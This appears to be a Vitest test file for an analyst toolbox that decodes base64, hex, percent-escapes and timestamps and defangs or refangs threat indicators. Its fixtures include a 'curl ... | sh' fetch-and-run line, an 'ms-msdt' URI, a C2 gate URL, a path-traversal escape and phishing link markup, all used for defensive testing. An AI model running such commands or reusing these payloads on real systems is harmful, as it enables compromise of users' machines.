import { describe, expect, it } from 'vitest'
import {
  decodeBase64,
  decodeHex,
  decodePercentEscapes,
  defangSelection,
  defangText,
  derivedCallout,
  readTimestamp,
  refangSelection,
  runToolbox
} from './toolbox'

// Fixtures built with browser primitives: the plugin reads base64 with atob
// and TextDecoder, so the tests should make it the same way it is read.
const b64 = (bytes: number[]): string => btoa(String.fromCharCode(...bytes))
const utf16le = (s: string): number[] => [...s].flatMap((c) => [c.charCodeAt(0) & 0xff, c.charCodeAt(0) >> 8])
const utf8 = (s: string): number[] => [...new TextEncoder().encode(s)]

describe('decodeBase64', () => {
  it('reads a PowerShell -EncodedCommand, which is UTF-16LE', () => {
    // The case the whole thing exists for: decoded as UTF-8 this is "W-r-i-t-e"
    // with a NUL between every letter, which is why a UTF-8-only decoder is
    // useless here.
    const encoded = b64(utf16le('Write-Host hello'))
    const readings = decodeBase64(encoded)
    expect(readings).toEqual([{ as: 'UTF-16LE', text: 'Write-Host hello' }])
  })

  it('reads ordinary UTF-8 base64 and does not also offer a bogus UTF-16 reading', () => {
    const readings = decodeBase64(b64(utf8('curl http://example.com/a.sh | sh')))
    expect(readings).toEqual([{ as: 'UTF-8', text: 'curl http://example.com/a.sh | sh' }])
  })

  it('accepts the URL-safe alphabet and missing padding', () => {
    expect(decodeBase64('aHR0cHM6Ly9leGFtcGxlLmNvbS9hP2I9Yw')).toEqual([
      { as: 'UTF-8', text: 'https://example.com/a?b=c' }
    ])
  })

  it('returns nothing rather than mojibake when the bytes are not text', () => {
    expect(decodeBase64('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBD')).toEqual([]) // JPEG header
    expect(decodeBase64('not base64 at all!')).toEqual([])
    expect(decodeBase64('YWJj')).toEqual([]) // too short to be worth offering
  })
})

describe('decodePercentEscapes', () => {
  it('decodes until the text stops changing', () => {
    expect(decodePercentEscapes('https%253A%252F%252Fevil.test%252Fa')).toBe('https://evil.test/a')
  })

  it('leaves + alone — it only means a space in a form-encoded query', () => {
    expect(decodePercentEscapes('a+b%20c')).toBe('a+b c')
  })

  it('decodes every valid run even when another escape is malformed', () => {
    // One stray % or a %TEMP% used to stop the whole selection from decoding.
    expect(decodePercentEscapes('100%25 sure %ZZ')).toBe('100% sure %ZZ')
    expect(decodePercentEscapes('%TEMP% x%2Fy')).toBe('%TEMP% x/y')
    expect(decodePercentEscapes('https://x.test/?p=100%&next=%68%74%74%70%73%3A%2F%2Fevil.test')).toBe(
      'https://x.test/?p=100%&next=https://evil.test'
    )
  })

  it('keeps bytes that are not valid UTF-8 as written, never a guessed character', () => {
    expect(decodePercentEscapes('..%c0%af..')).toBe('..%c0%af..')
    // The ASCII escapes around them are valid on their own.
    expect(decodePercentEscapes('%2F%c0%af%2E')).toBe('/%c0%af.')
    expect(decodePercentEscapes('%e2%82%ac %c3')).toBe('€ %c3')
  })
})

describe('decodeHex', () => {
  it('tolerates 0x, spaces and colons', () => {
    expect(decodeHex('68 65 6c 6c 6f')).toBe('hello')
    expect(decodeHex('0x68:0x65:0x6c:0x6c:0x6f')).toBe('hello')
  })

  it('refuses odd-length and non-hex input', () => {
    expect(decodeHex('68656c6c6f7')).toBeNull()
    expect(decodeHex('zzzz')).toBeNull()
  })
})

describe('readTimestamp', () => {
  it('offers every plausible epoch with the assumption named', () => {
    const readings = readTimestamp('1758456720')
    expect(readings).toEqual([{ assumption: 'seconds since 1970 (Unix)', iso: '2025-09-21T12:12:00.000Z' }])
  })

  it('drops readings that land outside living memory instead of listing them', () => {
    // 13 digits is milliseconds; as seconds it lands in the year 57000, as
    // microseconds in 1970. Only one reading survives.
    const readings = readTimestamp('1758456720000')
    expect(readings).toEqual([{ assumption: 'milliseconds since 1970', iso: '2025-09-21T12:12:00.000Z' }])
  })

  it('reads Windows FILETIME and the WebKit epoch when the digits allow it', () => {
    const readings = readTimestamp('133718959200000000')
    expect(readings.map((r) => r.assumption)).toContain('100ns ticks since 1601 (Windows FILETIME)')
    expect(readings.find((r) => r.assumption.startsWith('100ns'))?.iso).toBe('2024-09-27T07:32:00.000Z')
  })

  it('says when a written date carried no zone rather than pretending it did', () => {
    expect(readTimestamp('2026-09-21T12:12:00Z')[0].assumption).toBe('as written (zone stated)')
    expect(readTimestamp('Sep 21, 2026 12:12')[0].assumption).toContain('no zone')
  })

  it('is empty for something that is not a time', () => {
    expect(readTimestamp('hello')).toEqual([])
  })

  it('offers no reading for text that does not state its own year, month and day', () => {
    // The legacy parser read these as 2001-09-26, 2019-01-01, 2001-06-30,
    // 0120-01-01 and 12 December: dates nobody wrote.
    for (const s of ['Sep 26 14:03:11', 'Server 2019', 'Build 7.1', 'Chrome 120', 'Windows 10', 'Decode 2019 12']) {
      expect(readTimestamp(s)).toEqual([])
    }
    // Day first or month first is not in the text.
    expect(readTimestamp('09/10/2026')).toEqual([])
  })

  it('labels the zone the way the parser actually read it', () => {
    expect(readTimestamp('2026-09-26')).toEqual([
      { assumption: 'date only (read as UTC midnight)', iso: '2026-09-26T00:00:00.000Z' }
    ])
    expect(readTimestamp('Thu, 10 Sep 2026 14:03:11 GMT')).toEqual([
      { assumption: 'as written (zone stated)', iso: '2026-09-10T14:03:11.000Z' }
    ])
    expect(readTimestamp('Mon, 21 Sep 2026 12:12:00 -0700 (PDT)')).toEqual([
      { assumption: 'as written (zone stated)', iso: '2026-09-21T19:12:00.000Z' }
    ])
    expect(readTimestamp('2026-09-10 14:03:11 UTC')).toEqual([
      { assumption: 'as written (zone stated)', iso: '2026-09-10T14:03:11.000Z' }
    ])
    expect(readTimestamp('2026-09-10 14:03:11+0100')[0].iso).toBe('2026-09-10T13:03:11.000Z')
    expect(readTimestamp('2026-09-10T14:03:11.123456Z')[0].iso).toBe('2026-09-10T14:03:11.123Z')
    expect(readTimestamp('2026-09-10 14:03:11')[0].assumption).toContain('no zone')
    // A short offset is applied by the parser, so it is a stated zone.
    for (const s of ['Sep 21 2026 12:12 GMT+2', 'Sep 21 2026 12:12 UTC+02', 'Sep 21 2026 12:12 +2']) {
      expect(readTimestamp(s)).toEqual([{ assumption: 'as written (zone stated)', iso: '2026-09-21T10:12:00.000Z' }])
    }
    // A year after a hyphen is not an offset.
    expect(readTimestamp('12:12 21-Sep-2026')[0].assumption).toContain('no zone')
  })

  it('offers no reading for a day the calendar does not have', () => {
    // V8 rolled each of these into the next month: a date nobody wrote.
    for (const s of [
      '2026-02-30',
      '2026-02-29',
      '2026-02-31T10:00Z',
      '2026-04-31 10:00',
      'Feb 30, 2026 10:00',
      'Sep 31 2026 10:00'
    ]) {
      expect(readTimestamp(s)).toEqual([])
    }
    // A stated zone may rightly move the UTC month; that is still a reading.
    expect(readTimestamp('Sep 30 2026 23:00 -0500')).toEqual([
      { assumption: 'as written (zone stated)', iso: '2026-10-01T04:00:00.000Z' }
    ])
    expect(readTimestamp('2028-02-29')).toHaveLength(1)
  })
})

describe('defang / refang selection', () => {
  it('defangs indicator lines and leaves prose alone', () => {
    const input = 'Sender used these:\n evil.test\nhttp://bad.test/a'
    expect(defangSelection(input)).toBe('Sender used these:\n evil[.]test\nhxxp://bad[.]test/a')
  })

  it('round-trips through refang', () => {
    expect(refangSelection(defangSelection('evil.test'))).toBe('evil.test')
  })

  it('refangs a value behind a bullet, a label or a bracket, not only at the line start', () => {
    // These came back half refanged: dots done, scheme still hxxp.
    expect(refangSelection('- hxxp://a[.]example/x')).toBe('- http://a.example/x')
    expect(refangSelection('url: hxxps://a[.]example/x')).toBe('url: https://a.example/x')
    expect(refangSelection('see (hxxp://a[.]example/x) now')).toBe('see (http://a.example/x) now')
    expect(refangSelection('* [\\\\]fileserver\\share')).toBe('* \\\\fileserver\\share')
  })

  it('defangs a value behind a list marker or a label, and UNC and scheme values', () => {
    expect(defangSelection('- http://a.example/x\n- http://b.example/y')).toBe(
      '- hxxp://a[.]example/x\n- hxxp://b[.]example/y'
    )
    expect(defangSelection('1. evil.example')).toBe('1. evil[.]example')
    expect(defangSelection('url: http://a.example/x')).toBe('url: hxxp://a[.]example/x')
    expect(defangSelection('\\\\fileserver\\share')).toBe('[\\\\]fileserver\\share')
    expect(defangSelection('javascript:alert(1)')).toBe('javascript[:]alert(1)')
    expect(defangSelection('ms-msdt:/id PCWDiagnostic')).toBe('ms-msdt[:]/id PCWDiagnostic')
  })

  it('still leaves prose, labels and drive paths alone', () => {
    for (const s of ['Note: see below', 'Time: 12:00', 'C:\\Windows\\x.exe', 'Reviewed app.js today']) {
      expect(defangSelection(s)).toBe(s)
    }
  })
})

describe('derivedCallout', () => {
  it('labels the output derived and names what produced it', () => {
    expect(derivedCallout('base64 → UTF-8', 'hello')).toBe('> [!note] Derived · base64 → UTF-8\n> ```\n> hello\n> ```')
  })

  it('cannot be broken out of by decoded content', () => {
    // Decoded content is hostile by assumption: it came out of an alert. A run
    // of backticks must not close the fence, and a line must not escape the quote.
    const hostile = '```\n> [!danger] Not a real callout\n`````'
    const out = derivedCallout('base64 → UTF-8', hostile)
    expect(out).toContain('> ``````')
    for (const line of out.split('\n')) expect(line.startsWith('>')).toBe(true)
  })

  it('quotes blank lines so the callout does not end early', () => {
    expect(derivedCallout('t', 'a\n\nb')).toBe('> [!note] Derived · t\n> ```\n> a\n>\n> b\n> ```')
  })
})

describe('runToolbox', () => {
  it('offers only the transforms that actually apply', async () => {
    const names = (await runToolbox('1758456720')).map((t) => t.name)
    expect(names).toContain('Read as a timestamp')
    expect(names).not.toContain('Decode base64')
    expect(names).not.toContain('Decode hex')
  })

  it('names the kind of indicator only when one value was defanged', async () => {
    const title = async (s: string) => (await runToolbox(s)).find((t) => t.name === 'Defang indicators')?.result.title
    expect(await title('http://a.example/x')).toBe('defanged (url)')
    // A list is several kinds, and a UNC path is not a domain.
    expect(await title('- http://a.example/x\n- bob@evil.example')).toBe('defanged')
    expect(await title('\\\\evil.example\\share')).toBe('defanged')
  })

  it('says when a percent decode left escapes as written', async () => {
    const hit = (await runToolbox('..%c0%af..%20')).find((t) => t.name === 'Decode percent-escapes')
    expect(hit?.result).toEqual({ title: 'percent-escapes partly decoded (some left as written)', body: '..%c0%af.. ' })
  })

  it('always offers a hash, because any selection has one', async () => {
    const hit = (await runToolbox('anything at all')).find((t) => t.name === 'Hash the selection')
    expect(hit?.result.body).toContain('SHA-256  25f4ec36fb1d43c5f7c4b56e252382d391f18d2544f8eaae115801e12dddafd1')
    expect(hit?.result.body).toContain('SHA-1    da86b2350d7133a0b9455e2c4cae962d691712b0')
  })
})

describe('a $ in a value does not corrupt it', () => {
  it('defangs a URL containing $& without expanding it', () => {
    // String.replace expands $&, $`, $' and $1 inside the REPLACEMENT string.
    // A corrupted indicator is worse than an undefanged one: it looks real.
    const url = 'http://evil.test/a?x=$&y=$1'
    const out = defangSelection(url)
    expect(out).toBe('hxxp://evil[.]test/a?x=$&y=$1')
    expect(out).not.toContain('evil.test/a?x=http')
  })

  it('round-trips it through refang', () => {
    const url = 'http://evil.test/a?x=$&y=$1'
    expect(refangSelection(defangSelection(url))).toBe(url)
  })
})

describe('defangText (right-click Defang)', () => {
  it('leaves versions and OIDs alone, and never defangs an already-defanged token twice', () => {
    for (const prose of ['1.3.6.1.5.5.7.3.1', '1.2.3.4.5', 'Firefox/115.0.2.1', 'Chrome/120.0.6099.109']) {
      expect(defangText(prose)).toBe(prose)
    }
    expect(defangText('src="10.0.0.1"')).toBe('src="10[.]0[.]0[.]1"')
    const once = defangText("https://x.test/?r='javascript://x'")
    expect(defangText(once)).toBe(once)
  })

  it('defangs a selected IP, a labelled line, and IPs, URLs and emails inside prose', () => {
    expect(defangText('172.16.17.56')).toBe('172[.]16[.]17[.]56')
    expect(defangText('Source Address : 172.16.17.56')).toBe('Source Address : 172[.]16[.]17[.]56')
    expect(defangText('User Sofia connected to 172.16.17.56 (and 8.8.8.8), see https://evil.example.com/a.')).toBe(
      'User Sofia connected to 172[.]16[.]17[.]56 (and 8[.]8[.]8[.]8), see hxxps://evil[.]example[.]com/a.'
    )
    expect(defangText('Reported by sofia@corp.example')).not.toContain('sofia@corp.example')
  })

  it('leaves dotted words in prose and anything already defanged alone', () => {
    expect(defangText('e.g. see report.pdf and ORDER SHEET & SPEC.xlsm')).toBe(
      'e.g. see report.pdf and ORDER SHEET & SPEC.xlsm'
    )
    expect(defangText('172[.]16[.]17[.]56 and hxxps://evil[.]example[.]com')).toBe(
      '172[.]16[.]17[.]56 and hxxps://evil[.]example[.]com'
    )
    expect(refangSelection(defangText('connected to 172.16.17.56'))).toBe('connected to 172.16.17.56')
    // The toolbox's line defang too: a second Defang changes nothing.
    expect(defangSelection(defangSelection('Source : 172.16.17.56'))).toBe('Source : 172[.]16[.]17[.]56')
  })

  it('defangs an indicator in inline code, smart quotes, braces or emphasis, and refangs it back', () => {
    expect(defangText('C2 at `https://evil.test/gate.php` and `203.0.113.9`, sender `phisher@evil.test`')).toBe(
      'C2 at `hxxps://evil[.]test/gate[.]php` and `203[.]0[.]113[.]9`, sender `phisher[at]evil[.]test`'
    )
    for (const s of [
      '“https://evil.test/a”',
      '‘https://evil.test/a’.',
      '{https://evil.test/a}',
      '*https://evil.test/a*'
    ]) {
      expect(defangText(s)).not.toContain('https://evil.test')
      expect(refangSelection(defangText(s))).toBe(s)
    }
  })

  it('defangs an indicator inside a longer token: an attribute, a markdown link, mailto', () => {
    for (const s of [
      '<a href="https://evil.test/login">Click</a>',
      '[x](https://evil.test/login)',
      '<img src=http://198.51.100.7/p.gif width=1>',
      "style='background:url(https://evil.test/a.png)'",
      '<a href="mailto:boss@evil.test">'
    ]) {
      const out = defangText(s)
      expect(out).not.toMatch(/https?:\/\/|evil\.test|198\.51|boss@/)
      expect(refangSelection(out)).toBe(s)
    }
    // Already defanged inside a token stays as written.
    expect(defangText('href="hxxps://evil[.]test/x"')).toBe('href="hxxps://evil[.]test/x"')
  })

  it('reads a long run of wrapper or word characters in one pass', () => {
    const start = performance.now()
    defangText(`${'.'.repeat(100_000)}a`)
    defangText(`x${'a'.repeat(100_000)}=`)
    expect(performance.now() - start).toBeLessThan(1500)
  })
})
